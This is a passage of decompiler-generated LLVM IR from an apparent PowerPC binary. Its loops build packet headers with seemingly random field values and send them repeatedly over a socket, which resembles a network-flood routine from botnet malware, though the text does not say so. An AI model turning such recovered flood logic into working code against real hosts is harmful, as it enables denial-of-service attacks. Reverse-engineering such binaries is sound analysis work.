  br label %dec_label_pc_1000494c

dec_label_pc_1000494c:                            ; preds = %dec_label_pc_1000494c.loopexit, %dec_label_pc_100047d0
  %v1_10004954.pre = phi i1 [ %v1_10004954.pre.pre, %dec_label_pc_1000494c.loopexit ], [ %v1_100047d0, %dec_label_pc_100047d0 ]
  %v0_10004954.pre = phi i1 [ %v0_10004954.pre.pre, %dec_label_pc_1000494c.loopexit ], [ %v3_100047d0, %dec_label_pc_100047d0 ]
  %v0_10004950 = phi i32 [ %v0_10004950.pre, %dec_label_pc_1000494c.loopexit ], [ %v1_100047e8, %dec_label_pc_100047d0 ]
  %v0_1000494c = load i32, i32* %r15.global-to-local, align 4
  %v3_1000494c = icmp eq i32 %v0_1000494c, -1
  store i1 %v3_1000494c, i1* %cr2_eq.global-to-local, align 1
  %v3_10004950 = icmp eq i32 %v0_10004950, 0
  store i1 %v3_10004950, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10004954.outer

dec_label_pc_10004954.outer:                      ; preds = %dec_label_pc_10004a30, %dec_label_pc_1000494c
  %v1_10004954.ph = phi i1 [ %v1_10004954.pre, %dec_label_pc_1000494c ], [ %v1_10004a30, %dec_label_pc_10004a30 ]
  %v0_10004954.ph = phi i1 [ %v0_10004954.pre, %dec_label_pc_1000494c ], [ %v0_10004a30, %dec_label_pc_10004a30 ]
  %v2_10004954 = or i1 %v1_10004954.ph, %v0_10004954.ph
  br label %dec_label_pc_10004954

dec_label_pc_10004954:                            ; preds = %dec_label_pc_10004954.outer, %dec_label_pc_10004954
  br i1 %v2_10004954, label %dec_label_pc_10004954, label %dec_label_pc_10004958

dec_label_pc_10004958:                            ; preds = %dec_label_pc_10004954, %dec_label_pc_10004a30
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-120, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004968

dec_label_pc_10004968:                            ; preds = %dec_label_pc_100049c0, %dec_label_pc_10004958
  %v0_10004968 = phi i32 [ %v1_10004a20, %dec_label_pc_100049c0 ], [ 0, %dec_label_pc_10004958 ]
  %v1_10004968 = mul i32 %v0_10004968, 24
  store i32 %v1_10004968, i32* %r0.global-to-local, align 4
  %v1_1000496c = mul i32 %v0_10004968, 4
  store i32 %v1_1000496c, i32* %r11.global-to-local, align 4
  %v1_10004970 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004970 = add i32 %v1_10004970, %v1_1000496c
  %v3_10004970 = inttoptr i32 %v2_10004970 to i32*
  %v4_10004970 = load i32, i32* %v3_10004970, align 4
  store i32 %v4_10004970, i32* %r28.global-to-local, align 4
  %v1_10004974 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004974 = add i32 %v1_10004974, %v1_10004968
  %v1_10004978 = add i32 %v2_10004974, 20
  %v2_10004978 = inttoptr i32 %v1_10004978 to i8*
  %v3_10004978 = load i8, i8* %v2_10004978, align 1
  %v4_10004978 = zext i8 %v3_10004978 to i32
  store i32 %v4_10004978, i32* %r9.global-to-local, align 4
  %v1_1000497c = add i32 %v4_10004970, 20
  store i32 %v1_1000497c, i32* @r31, align 4
  %tmp41 = icmp ult i8 %v3_10004978, 32
  br i1 %tmp41, label %dec_label_pc_10004a38, label %dec_label_pc_10004988

dec_label_pc_10004988:                            ; preds = %dec_label_pc_10004968
  %v0_10004988 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004988, label %dec_label_pc_10004a60, label %dec_label_pc_1000498c

dec_label_pc_1000498c:                            ; preds = %dec_label_pc_10004a38, %dec_label_pc_10004988
  store i32 65535, i32* %r29.global-to-local, align 4
  %v0_10004994 = load i32, i32* %r21.global-to-local, align 4
  %v4_10004994 = icmp eq i32 %v0_10004994, 65535
  br i1 %v4_10004994, label %dec_label_pc_10004a78, label %dec_label_pc_1000499c

dec_label_pc_1000499c:                            ; preds = %dec_label_pc_10004a60, %dec_label_pc_1000498c
  %v1_1000499c = phi i32 [ %v1_10004a70, %dec_label_pc_10004a60 ], [ 65535, %dec_label_pc_1000498c ]
  %v0_1000499c = load i32, i32* %r22.global-to-local, align 4
  %v4_1000499c = icmp eq i32 %v0_1000499c, %v1_1000499c
  br i1 %v4_1000499c, label %dec_label_pc_10004a88, label %dec_label_pc_100049a4

dec_label_pc_100049a4:                            ; preds = %dec_label_pc_10004a78.dec_label_pc_100049a4_crit_edge, %dec_label_pc_1000499c
  %v1_100049a4 = phi i32 [ %v1_100049a4.pre, %dec_label_pc_10004a78.dec_label_pc_100049a4_crit_edge ], [ %v1_1000499c, %dec_label_pc_1000499c ]
  %v0_100049a4 = load i32, i32* %r23.global-to-local, align 4
  %v4_100049a4 = icmp eq i32 %v0_100049a4, %v1_100049a4
  br i1 %v4_100049a4, label %dec_label_pc_10004a98, label %dec_label_pc_100049ac

dec_label_pc_100049ac:                            ; preds = %dec_label_pc_10004a88.dec_label_pc_100049ac_crit_edge, %dec_label_pc_100049a4
  %v1_100049ac = phi i32 [ %v1_100049ac.pre, %dec_label_pc_10004a88.dec_label_pc_100049ac_crit_edge ], [ %v1_100049a4, %dec_label_pc_100049a4 ]
  %v0_100049ac = load i32, i32* %r19.global-to-local, align 4
  %v4_100049ac = icmp eq i32 %v0_100049ac, %v1_100049ac
  br i1 %v4_100049ac, label %dec_label_pc_10004aa8, label %dec_label_pc_100049b4

dec_label_pc_100049b4:                            ; preds = %dec_label_pc_10004a98.dec_label_pc_100049b4_crit_edge, %dec_label_pc_100049ac
  %v1_100049b4 = phi i32 [ %v1_100049b4.pre, %dec_label_pc_10004a98.dec_label_pc_100049b4_crit_edge ], [ %v1_100049ac, %dec_label_pc_100049ac ]
  %v0_100049b4 = load i32, i32* %r20.global-to-local, align 4
  %v4_100049b4 = icmp eq i32 %v0_100049b4, %v1_100049b4
  br i1 %v4_100049b4, label %dec_label_pc_10004ab8, label %dec_label_pc_100049bc

dec_label_pc_100049bc:                            ; preds = %dec_label_pc_10004aa8, %dec_label_pc_100049b4
  %v0_100049bc = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100049bc, label %dec_label_pc_100049c0, label %dec_label_pc_10004ac4

dec_label_pc_100049c0:                            ; preds = %dec_label_pc_100049bc, %dec_label_pc_10004ab8, %dec_label_pc_10004ac4
  %v0_100049c0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100049c0 = trunc i32 %v0_100049c0 to i16
  %v2_100049c0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100049c0 = add i32 %v2_100049c0, 10
  %v4_100049c0 = inttoptr i32 %v3_100049c0 to i16*
  store i16 %v1_100049c0, i16* %v4_100049c0, align 2
  %v0_100049c8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100049c8, i32* @r3, align 4
  %v2_100049cc = call i32 @function_100060d4(i32 %v0_100049c8, i32 20)
  %v3_100049cc = trunc i32 %v2_100049cc to i16
  %v0_100049d0 = load i32, i32* @r31, align 4
  store i32 %v0_100049d0, i32* @r4, align 4
  %v4_100049d4 = add i32 %v0_100049c8, 10
  %v5_100049d4 = inttoptr i32 %v4_100049d4 to i16*
  store i16 %v3_100049cc, i16* %v5_100049d4, align 2
  %v0_100049dc = load i32, i32* %r30.global-to-local, align 4
  %v1_100049dc = trunc i32 %v0_100049dc to i16
  %v2_100049dc = load i32, i32* @r31, align 4
  %v3_100049dc = add i32 %v2_100049dc, 16
  %v4_100049dc = inttoptr i32 %v3_100049dc to i16*
  store i16 %v1_100049dc, i16* %v4_100049dc, align 2
  %v0_100049e4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100049e4, i32* %r3.global-to-local, align 4
  %v4_100049e8 = call i32 @function_10006138(i32 %v0_100049e4, i32 %v0_100049d0, i32 40, i32 40)
  %v5_100049e8 = trunc i32 %v4_100049e8 to i16
  store i32 %v4_100049e8, i32* %r3.global-to-local, align 4
  %v3_100049ec = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100049ec, i32* %r7.global-to-local, align 4
  %v0_100049f0 = load i32, i32* @r31, align 4
  %v1_100049f0 = add i32 %v0_100049f0, 2
  %v2_100049f0 = inttoptr i32 %v1_100049f0 to i16*
  %v3_100049f0 = load i16, i16* %v2_100049f0, align 2
  %v4_100049f0 = zext i16 %v3_100049f0 to i32
  store i32 %v4_100049f0, i32* %r0.global-to-local, align 4
  %v0_100049f4 = load i32, i32* %r28.global-to-local, align 4
  %v1_100049f8 = mul i32 %v3_100049ec, 24
  store i32 %v1_100049f8, i32* %r7.global-to-local, align 4
  %v4_100049fc = add i32 %v0_100049f0, 16
  %v5_100049fc = inttoptr i32 %v4_100049fc to i16*
  store i16 %v5_100049e8, i16* %v5_100049fc, align 2
  %v0_10004a04 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10004a04, i32* %r3.global-to-local, align 4
  %v0_10004a08 = load i32, i32* %r7.global-to-local, align 4
  %v1_10004a08 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004a08 = add i32 %v1_10004a08, %v0_10004a08
  store i32 %v2_10004a08, i32* %r7.global-to-local, align 4
  %v0_10004a10 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004a10 = trunc i32 %v0_10004a10 to i16
  %v3_10004a10 = add i32 %v2_10004a08, 2
  %v4_10004a10 = inttoptr i32 %v3_10004a10 to i16*
  store i16 %v1_10004a10, i16* %v4_10004a10, align 2
  store i32 268454428, i32* @lr, align 4
  %v6_10004a18 = call i32 @function_1000c140(i32 %v0_10004a04, i32 %v0_100049f4, i32 60, i32 16384, i32 %v2_10004a08, i32 16)
  store i32 %v6_10004a18, i32* %r3.global-to-local, align 4
  %v3_10004a1c = load i32, i32* %stack_var_-120, align 4
  %v1_10004a20 = add i32 %v3_10004a1c, 1
  store i32 %v1_10004a20, i32* %r9.global-to-local, align 4
  %v1_10004a24 = load i32, i32* %r24.global-to-local, align 4
  %v2_10004a24 = icmp slt i32 %v1_10004a20, %v1_10004a24
  store i32 %v1_10004a20, i32* %stack_var_-120, align 4
  br i1 %v2_10004a24, label %dec_label_pc_10004968, label %dec_label_pc_10004a30

dec_label_pc_10004a30:                            ; preds = %dec_label_pc_100049c0
  %v0_10004a30 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004a30 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004a30 = or i1 %v0_10004a30, %v1_10004a30
  br i1 %v2_10004a30, label %dec_label_pc_10004954.outer, label %dec_label_pc_10004958

dec_label_pc_10004a38:                            ; preds = %dec_label_pc_10004968
  %v1_10004a38 = add i32 %v2_10004974, 16
  %v2_10004a38 = inttoptr i32 %v1_10004a38 to i32*
  %v3_10004a38 = load i32, i32* %v2_10004a38, align 4
  store i32 %v3_10004a38, i32* %r29.global-to-local, align 4
  %v0_10004a3c = call i32 @function_10007ca8()
  store i32 %v0_10004a3c, i32* %r3.global-to-local, align 4
  %v3_10004a40 = load i32, i32* %stack_var_-120, align 4
  %v1_10004a44 = mul i32 %v3_10004a40, 24
  %v1_10004a48 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004a48 = add i32 %v1_10004a48, %v1_10004a44
  store i32 %v2_10004a48, i32* %r9.global-to-local, align 4
  %v1_10004a4c = add i32 %v2_10004a48, 20
  %v2_10004a4c = inttoptr i32 %v1_10004a4c to i8*
  %v3_10004a4c = load i8, i8* %v2_10004a4c, align 1
  %v4_10004a4c = zext i8 %v3_10004a4c to i32
  store i32 %v4_10004a4c, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004a4c, 64
  %v2_10004a50 = zext i8 %tmp to i32
  %v3_10004a50 = lshr i32 %v0_10004a3c, %v2_10004a50
  store i32 %v3_10004a50, i32* %r3.global-to-local, align 4
  %v0_10004a54 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004a54 = add i32 %v3_10004a50, %v0_10004a54
  store i32 %v2_10004a54, i32* %r29.global-to-local, align 4
  %v1_10004a58 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004a58 = add i32 %v1_10004a58, 16
  %v3_10004a58 = inttoptr i32 %v2_10004a58 to i32*
  store i32 %v2_10004a54, i32* %v3_10004a58, align 4
  %v0_10004a5c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004a5c, label %dec_label_pc_10004a60, label %dec_label_pc_1000498c

dec_label_pc_10004a60:                            ; preds = %dec_label_pc_10004a38, %dec_label_pc_10004988
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10004a64 = call i32 @function_10007ca8()
  store i32 %v0_10004a64, i32* %r3.global-to-local, align 4
  store i32 65535, i32* %r29.global-to-local, align 4
  %v1_10004a6c = load i32, i32* %r28.global-to-local, align 4
  %v2_10004a6c = add i32 %v1_10004a6c, 12
  %v3_10004a6c = inttoptr i32 %v2_10004a6c to i32*
  store i32 %v0_10004a64, i32* %v3_10004a6c, align 4
  %v0_10004a70 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004a70 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004a70 = icmp eq i32 %v0_10004a70, %v1_10004a70
  br i1 %v4_10004a70, label %dec_label_pc_10004a78, label %dec_label_pc_1000499c

dec_label_pc_10004a78:                            ; preds = %dec_label_pc_10004a60, %dec_label_pc_1000498c
  %v0_10004a78 = call i32 @function_10007ca8()
  %v1_10004a78 = trunc i32 %v0_10004a78 to i16
  store i32 %v0_10004a78, i32* %r3.global-to-local, align 4
  %v0_10004a7c = load i32, i32* %r22.global-to-local, align 4
  %v1_10004a7c = load i32, i32* %r29.global-to-local, align 4
  %v4_10004a7c = icmp eq i32 %v0_10004a7c, %v1_10004a7c
  %v3_10004a80 = load i32, i32* %r28.global-to-local, align 4
  %v4_10004a80 = add i32 %v3_10004a80, 4
  %v5_10004a80 = inttoptr i32 %v4_10004a80 to i16*
  store i16 %v1_10004a78, i16* %v5_10004a80, align 2
  br i1 %v4_10004a7c, label %dec_label_pc_10004a88, label %dec_label_pc_10004a78.dec_label_pc_100049a4_crit_edge

dec_label_pc_10004a78.dec_label_pc_100049a4_crit_edge: ; preds = %dec_label_pc_10004a78
  %v1_100049a4.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100049a4

dec_label_pc_10004a88:                            ; preds = %dec_label_pc_10004a78, %dec_label_pc_1000499c
  %v0_10004a88 = call i32 @function_10007ca8()
  %v1_10004a88 = trunc i32 %v0_10004a88 to i16
  store i32 %v0_10004a88, i32* %r3.global-to-local, align 4
  %v0_10004a8c = load i32, i32* %r23.global-to-local, align 4
  %v1_10004a8c = load i32, i32* %r29.global-to-local, align 4
  %v4_10004a8c = icmp eq i32 %v0_10004a8c, %v1_10004a8c
  %v3_10004a90 = load i32, i32* %r28.global-to-local, align 4
  %v4_10004a90 = add i32 %v3_10004a90, 20
  %v5_10004a90 = inttoptr i32 %v4_10004a90 to i16*
  store i16 %v1_10004a88, i16* %v5_10004a90, align 2
  br i1 %v4_10004a8c, label %dec_label_pc_10004a98, label %dec_label_pc_10004a88.dec_label_pc_100049ac_crit_edge

dec_label_pc_10004a88.dec_label_pc_100049ac_crit_edge: ; preds = %dec_label_pc_10004a88
  %v1_100049ac.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100049ac

dec_label_pc_10004a98:                            ; preds = %dec_label_pc_10004a88, %dec_label_pc_100049a4
  %v0_10004a98 = call i32 @function_10007ca8()
  %v1_10004a98 = trunc i32 %v0_10004a98 to i16
  store i32 %v0_10004a98, i32* %r3.global-to-local, align 4
  %v0_10004a9c = load i32, i32* %r19.global-to-local, align 4
  %v1_10004a9c = load i32, i32* %r29.global-to-local, align 4
  %v4_10004a9c = icmp eq i32 %v0_10004a9c, %v1_10004a9c
  %v3_10004aa0 = load i32, i32* @r31, align 4
  %v4_10004aa0 = add i32 %v3_10004aa0, 2
  %v5_10004aa0 = inttoptr i32 %v4_10004aa0 to i16*
  store i16 %v1_10004a98, i16* %v5_10004aa0, align 2
  br i1 %v4_10004a9c, label %dec_label_pc_10004aa8, label %dec_label_pc_10004a98.dec_label_pc_100049b4_crit_edge

dec_label_pc_10004a98.dec_label_pc_100049b4_crit_edge: ; preds = %dec_label_pc_10004a98
  %v1_100049b4.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100049b4

dec_label_pc_10004aa8:                            ; preds = %dec_label_pc_10004a98, %dec_label_pc_100049ac
  %v0_10004aa8 = call i32 @function_10007ca8()
  store i32 %v0_10004aa8, i32* %r3.global-to-local, align 4
  %v0_10004aac = load i32, i32* %r20.global-to-local, align 4
  %v1_10004aac = load i32, i32* %r29.global-to-local, align 4
  %v4_10004aac = icmp eq i32 %v0_10004aac, %v1_10004aac
  %v1_10004ab0 = load i32, i32* @r31, align 4
  %v2_10004ab0 = add i32 %v1_10004ab0, 4
  %v3_10004ab0 = inttoptr i32 %v2_10004ab0 to i32*
  store i32 %v0_10004aa8, i32* %v3_10004ab0, align 4
  br i1 %v4_10004aac, label %dec_label_pc_10004ab8, label %dec_label_pc_100049bc

dec_label_pc_10004ab8:                            ; preds = %dec_label_pc_10004aa8, %dec_label_pc_100049b4
  %v0_10004ab8 = call i32 @function_10007ca8()
  store i32 %v0_10004ab8, i32* %r3.global-to-local, align 4
  %v1_10004abc = load i32, i32* @r31, align 4
  %v2_10004abc = add i32 %v1_10004abc, 8
  %v3_10004abc = inttoptr i32 %v2_10004abc to i32*
  store i32 %v0_10004ab8, i32* %v3_10004abc, align 4
  %v0_10004ac0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004ac0, label %dec_label_pc_100049c0, label %dec_label_pc_10004ac4

dec_label_pc_10004ac4:                            ; preds = %dec_label_pc_100049bc, %dec_label_pc_10004ab8
  %v0_10004ac4 = call i32 @function_10007ca8()
  %v1_10004ac4 = trunc i32 %v0_10004ac4 to i16
  store i32 %v0_10004ac4, i32* %r3.global-to-local, align 4
  %v3_10004ac8 = load i32, i32* @r31, align 4
  %v4_10004ac8 = add i32 %v3_10004ac8, 18
  %v5_10004ac8 = inttoptr i32 %v4_10004ac8 to i16*
  store i16 %v1_10004ac4, i16* %v5_10004ac8, align 2
  br label %dec_label_pc_100049c0

dec_label_pc_10004ad0:                            ; preds = %dec_label_pc_100047ac
  %v0_10004ad0 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10004ad0, i32* %r3.global-to-local, align 4
  store i32 268454616, i32* @lr, align 4
  %v0_10004ad4 = call i32 @function_1000b3f0()
  store i32 %v0_10004ad4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004ad8

dec_label_pc_10004ad8:                            ; preds = %dec_label_pc_10004594, %dec_label_pc_10004ad0
  store i32 %v0_100045ac, i32* %r0.global-to-local, align 4
  %v1_10004aec = call %0 @__asm_mtcrf(i32 56, i32 %v0_1000459c)
  store i32 %v0_100045ec, i32* %r28.global-to-local, align 4
  store i32 %v0_100045f4, i32* %r29.global-to-local, align 4
  store i32 %v0_10004600, i32* %r31.global-to-local, align 4
  %v0_10004b34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004b34

; uselistorder directives
  uselistorder i32 %v0_10004ac4, { 1, 0 }
  uselistorder i32 %v0_10004a98, { 1, 0 }
  uselistorder i32 %v0_10004a88, { 1, 0 }
  uselistorder i32 %v0_10004a78, { 1, 0 }
  uselistorder i32 %v1_10004a70, { 1, 0 }
  uselistorder i1 %v1_10004a30, { 1, 0 }
  uselistorder i1 %v0_10004a30, { 1, 0 }
  uselistorder i32 %v1_10004a20, { 0, 2, 3, 1 }
  uselistorder i32 %v4_100049e8, { 1, 0 }
  uselistorder i32 %v1_1000496c, { 1, 0 }
  uselistorder i32 %v1_1000482c, { 1, 0 }
  uselistorder i32 %v1_10004824, { 1, 0 }
  uselistorder i32 %v1_1000480c, { 1, 0 }
  uselistorder i32 %v1_10004808, { 1, 0 }
  uselistorder i32 %v1_10004804, { 1, 0 }
  uselistorder i32 %v1_10004800, { 1, 0 }
  uselistorder i32 %v1_100047fc, { 1, 0 }
  uselistorder i32 %v1_100047f8, { 1, 0 }
  uselistorder i32 %v1_100047e8, { 1, 0 }
  uselistorder i8 %v5_10004664, { 1, 0 }
  uselistorder i8 %v5_1000462c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r31.global-to-local, { 24, 25, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 22, 23 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 9, 13, 10, 8, 11, 14, 12, 2, 3, 5, 4, 6, 7, 15, 0 }
  uselistorder i32* %r28.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r23.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r22.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r15.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 5, 1, 2, 3, 0, 4 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 1, 6, 2, 3, 4, 5, 7, 8, 9, 10, 11 }
  uselistorder i1* %cr4_lt.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i8 4, { 3, 4, 0, 1, 2 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_10004ad8, { 1, 0 }
  uselistorder label %dec_label_pc_10004ac4, { 1, 0 }
  uselistorder label %dec_label_pc_100049c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004958, { 1, 0 }
  uselistorder label %dec_label_pc_10004954, { 1, 0 }
  uselistorder label %dec_label_pc_10004878, { 1, 0 }
}

define i32 @function_10004b38(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004b38:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_10004b40 = call i32 @__asm_mfcr()
  store i32 %v0_10004b40, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10004b6c = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004b74 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268454808, i32* @lr, align 4
  %v2_10004b94 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10004b94, i32* %r27.global-to-local, align 4
  %v0_10004ba0 = load i32, i32* @r30, align 4
  store i32 %v0_10004ba0, i32* %r3.global-to-local, align 4
  store i32 268454824, i32* @lr, align 4
  %v2_10004ba4 = call i32 @function_1000c548(i32 %v0_10004ba0, i32 4)
  %v0_10004bac = load i32, i32* @r28, align 4
  store i32 %v2_10004ba4, i32* %r26.global-to-local, align 4
  %v0_10004bbc = load i32, i32* @r29, align 4
  store i32 %v0_10004bbc, i32* %r3.global-to-local, align 4
  store i32 268454852, i32* @lr, align 4
  %v4_10004bc0 = inttoptr i32 %v0_10004bac to i32*
  %v5_10004bc0 = call i32 @function_1000235c(i32 %v0_10004bbc, i32* %v4_10004bc0, i32 7, i32 65535)
  %v0_10004bcc = load i32, i32* @r28, align 4
  %v1_10004bd4 = urem i32 %v5_10004bc0, 65536
  store i32 %v1_10004bd4, i32* %r21.global-to-local, align 4
  %v0_10004bd8 = load i32, i32* @r29, align 4
  store i32 %v0_10004bd8, i32* %r3.global-to-local, align 4
  store i32 268454880, i32* @lr, align 4
  %v4_10004bdc = inttoptr i32 %v0_10004bcc to i32*
  %v5_10004bdc = call i32 @function_1000235c(i32 %v0_10004bd8, i32* %v4_10004bdc, i32 6, i32 65535)
  %v0_10004be0 = load i32, i32* @r28, align 4
  %v1_10004be4 = urem i32 %v5_10004bdc, 65536
  store i32 %v1_10004be4, i32* %r22.global-to-local, align 4
  %v0_10004bf0 = load i32, i32* @r29, align 4
  store i32 %v0_10004bf0, i32* %r3.global-to-local, align 4
  store i32 268454904, i32* @lr, align 4
  %v4_10004bf4 = inttoptr i32 %v0_10004be0 to i32*
  %v5_10004bf4 = call i32 @function_1000235c(i32 %v0_10004bf0, i32* %v4_10004bf4, i32 0, i32 512)
  %v0_10004bf8 = load i32, i32* @r28, align 4
  %v1_10004bfc = urem i32 %v5_10004bf4, 65536
  store i32 %v1_10004bfc, i32* @r31, align 4
  %v0_10004c04 = load i32, i32* @r29, align 4
  store i32 %v0_10004c04, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10004c10.79 to i32), i32* @lr, align 4
  %v4_10004c0c = inttoptr i32 %v0_10004bf8 to i32*
  %v5_10004c0c = call i32 @function_1000235c(i32 %v0_10004c04, i32* %v4_10004c0c, i32 1, i32 1)
  store i32 %v5_10004c0c, i32* %r3.global-to-local, align 4
  %v0_10004c1c = load i32, i32* %r22.global-to-local, align 4
  %v4_10004c1c = icmp eq i32 %v0_10004c1c, 65535
  %v1_10004c24 = urem i32 %v5_10004c0c, 256
  store i32 %v1_10004c24, i32* %r23.global-to-local, align 4
  store i32 0, i32* %stack_var_-72, align 4
  br i1 %v4_10004c1c, label %dec_label_pc_10004e20, label %dec_label_pc_10004c38

dec_label_pc_10004c38:                            ; preds = %dec_label_pc_10004b38, %dec_label_pc_10004e20
  %v0_10004c38 = load i32, i32* @r30, align 4
  %v1_10004c38 = icmp slt i32 %v0_10004c38, 0
  %v3_10004c38 = icmp eq i32 %v0_10004c38, 0
  store i1 %v1_10004c38, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10004c38, i1* %cr4_eq.global-to-local, align 1
  %tmp38 = icmp slt i32 %v0_10004c38, 1
  br i1 %tmp38, label %dec_label_pc_10004cf8, label %dec_label_pc_10004c40

dec_label_pc_10004c40:                            ; preds = %dec_label_pc_10004c38
  %v0_10004c44 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10004c44, i32* @r28, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  %v0_10004c50 = load i32, i32* %r21.global-to-local, align 4
  %v4_10004c50 = icmp eq i32 %v0_10004c50, 65535
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 2, i32* %r20.global-to-local, align 4
  %v2_10004da0 = ptrtoint i32* %stack_var_-72 to i32
  br i1 %v4_10004c50, label %dec_label_pc_10004d70, label %dec_label_pc_10004c64

dec_label_pc_10004c64:                            ; preds = %dec_label_pc_10004c40, %dec_label_pc_10004cd8
  %v0_10004c70 = phi i32 [ %v0_10004cec, %dec_label_pc_10004cd8 ], [ 0, %dec_label_pc_10004c40 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_10004c70 = add i32 %v0_10004c70, 1
  store i32 %v1_10004c70, i32* %r24.global-to-local, align 4
  store i32 268455032, i32* @lr, align 4
  %v2_10004c74 = call i32 @function_1000c548(i32 65535, i32 1)
  %v0_10004c78 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004c78 = trunc i32 %v0_10004c78 to i16
  %v2_10004c78 = load i32, i32* @r28, align 4
  %v3_10004c78 = add i32 %v2_10004c78, 2
  %v4_10004c78 = inttoptr i32 %v3_10004c78 to i16*
  store i16 %v1_10004c78, i16* %v4_10004c78, align 2
  %v1_10004c7c = load i32, i32* %r25.global-to-local, align 4
  %v2_10004c7c = load i32, i32* %r27.global-to-local, align 4
  %v3_10004c7c = add i32 %v2_10004c7c, %v1_10004c7c
  %v4_10004c7c = inttoptr i32 %v3_10004c7c to i32*
  store i32 %v2_10004c74, i32* %v4_10004c7c, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268455056, i32* @lr, align 4
  %v3_10004c8c = call i32 @function_1000c1bc(i32 2, i32 2, i32 17)
  store i32 %v3_10004c8c, i32* %r3.global-to-local, align 4
  %v3_10004c94 = icmp eq i32 %v3_10004c8c, -1
  %v1_10004c9c = load i32, i32* %r25.global-to-local, align 4
  %v2_10004c9c = load i32, i32* %r26.global-to-local, align 4
